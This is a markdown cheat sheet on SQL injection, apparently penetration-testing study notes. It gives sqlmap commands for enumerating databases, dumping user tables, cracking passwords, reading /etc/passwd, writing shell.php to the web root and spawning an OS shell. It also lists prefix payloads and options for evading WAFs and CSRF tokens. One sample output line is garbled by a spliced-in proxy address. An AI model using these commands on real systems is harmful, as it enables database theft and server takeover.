# SQL injection
![typesofSQLi](/images/types_of_sqli.jpg)



## SQLi Discovery

| Payload | 	URL Encoded|
|:--------|:---------------|
|'	|%27|
|"	|%22|
|#	|%23|
|;	|%3B|
|)	|%29|


## SQLmap

|Command|	Description|
|:------|:-------------|
|`sqlmap -h`|	View the basic help menu|
|`sqlmap -hh`|	View the advanced help menu|
|`sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`|	Run SQLMap without asking for user input|
|`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`|	SQLMap with POST request|
|`sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`|	POST request specifying an injection point with an asterisk|
|`sqlmap -r req.txt`|	Passing an HTTP request file to SQLMap|
|`sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`|	Specifying a cookie header|
|`sqlmap -u www.target.com --data='id=1' --method PUT`|	Specifying a PUT request|
|`sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`|	Store traffic to an output file|
|`sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`|	Specify verbosity level|
|`sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`|	Specifying a prefix or suffix|
|`sqlmap -u www.example.com/?id=1 -v 3 --level=5`|	Specifying the level and risk|
|`sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`|	Basic DB enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`|	Table enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`|	Table/row enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`|	Conditional enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --schema`|	Database schema enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --search -T user`|	Searching for data|
|`sqlmap -u "http://www.example.com/?id=1" --passwords --batch`|	Password enumeration and cracking|
|`sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`|	Anti-CSRF token bypass|
|`sqlmap --list-tampers`|	List all tamper scripts|
|`sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`|	Check for DBA privileges|
|`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`|	Reading a local file|
|`sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`|	Writing a file|
|`sqlmap -u "http://www.example.com/?id=1" --os-shell`|	Spawning an OS shell|

- **Possibilities of prefix**
```
'
"
`
#
-- 
;
)
''
')
'')
''))
');
'');
''));
""
")
"")
"))
""))
");
"");
"));
""));
`)
``)
`))
``))
`);
``);
`));
``));
'"
'");
'"));
"'
"');
"'));
"`
"`);
"`));
'`
'`);
'`));
`"
`");
`"));
`'
`');
`'));
\'
\"
```

- **Bypassing Web Application Protections**
1. Anti-CSRF Token Bypass
    - `--csrf-token`. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.

    ```bash
    [!bash!]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

            ___
        __H__
    ___ ___[,]_____ ___ ___  {1.4.9}
    |_ -| . [']     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org

    [*] starting @ 22:18:01 /2020-09-18/

    POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
    ```
2. Unique Value Bypass
    ```bash
    [!bash!]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

    URI: http://www.example.com:80/?id=1&rp=99954
    URI: http://www.example.com:80/?id=1&rp=87216
    URI: http://www.example.com:80/?id=9030&rp=36456
    URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
    URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
    URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
    ```

3. Calculated Parameter Bypass
    ```bash
    [!bash!]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

    URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
    URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
    URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
    URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
    URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
    URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
    ```
4. WAF Bypass
    - `--skip-waf`
 
5. User-agent Blacklisting Bypass
    - `--random-agent`
6. Tamper Scripts
    - `--list-tampers` , `--tamper=between,randomcase`

    |Tamper-Script|	Description|
    |:------------|:------------|
    |0eunion|	Replaces instances of UNION with e0UNION|
    |base64encode|	Base64-encodes all characters in a given payload|
    |between|	Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #|
    |commalesslimit|	Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart|
    |equaltolike|	Replaces all occurrences of operator equal (=) with LIKE counterpart|
    |halfversionedmorekeywords|	Adds (MySQL) versioned comment before each keyword|
    |modsecurityversioned|	Embraces complete query with (MySQL) versioned comment|
    |modsecurityzeroversioned|	Embraces complete query with (MySQL) zero-versioned comment|
    |percentage|	Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
    |plus2concat|	Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart|
    |randomcase|	Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
    |space2comment|	Replaces space character ( ) with comments `/|
    |space2dash|	Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)|
    |space2hash|	Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)|
    |space2mssqlblank|	Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
    |space2plus|	Replaces space character ( ) with plus (+)|
    |space2randomblank|	Replaces space character ( ) with a random blank character from a valid set of alternate characters|
    |symboliclogical|	Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|\|`)|
    |versionedkeywords|	Encloses each non-function keyword with (MySQL) versioned comment|
    |versionedmorekeywords|	Encloses each keyword with (MySQL) versioned comment|

## Resources
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

- [Portswigger cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)



